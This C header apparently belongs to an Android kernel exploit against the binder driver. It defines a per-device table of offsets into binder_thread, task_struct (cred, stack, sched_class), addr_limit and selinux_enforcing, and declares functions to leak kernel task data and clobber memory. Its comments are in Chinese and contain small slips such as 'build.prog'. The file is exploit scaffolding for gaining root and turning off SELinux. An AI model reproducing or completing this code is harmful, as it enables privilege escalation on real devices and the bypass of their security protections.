#ifndef _DEVINFO_H_
#define _DEVINFO_H_

struct leak_data;
struct leak_gdata;
struct clobber_gdata;

enum{
	DEVINFO_OFFSET_NO,
	DEVINFO_OFFSET_OK,
};

struct devinfo{
	int flag;
	char* devname; 	               // 设备名称 /system/build.prog/ ro.product.model
	char* kernver;                 // 内存版本 /proc/version, uname -r
	int binder_thread_size; 	   // binder_thread 结构体大小
	int offset_binder_task; 	   // offsetof(binder_thread.task)
	int offset_binder_next; 	   // offsetof(binder_thread.wait.task_list.next)
	int offset_binder_wait; 	   // offsetof(binder_thread.wait)
	int offset_binder_next_task;   // binder_thread 结构体中next和task字段之间的偏移
	int offset_task_stack;		   // offsetof(task_struct.stack)
	int offset_task_cred;		   // offsetof(task_struct.cred)
	int offset_task_sched_class;   // offsetof(task_struct.sched_class)
	int offset_addr_limit;		   // offsetof(thread_info.addr_limit)
	int offset_selinux; 		   // 全局变量 fair_sched_class 与 selinux_enforcing 之间的偏移
	int kern_copy_offset;          // 泄漏的内核地址与拷贝地址之间的偏移
	int kern_copy_size;	           // 总共需要拷贝数据的大小
	int (*leak_task)(int binder_fd, int epfd, struct leak_data* dat);
	int (*leak_group_data)(int binder_fd, int epfd, struct leak_gdata* gdata);
	int (*clobber_group_data)(int binder_fd, int epfd, struct clobber_gdata* gdata, int count);
};

extern struct devinfo *dev_info;

struct devinfo* get_devinfo(void);

#endif
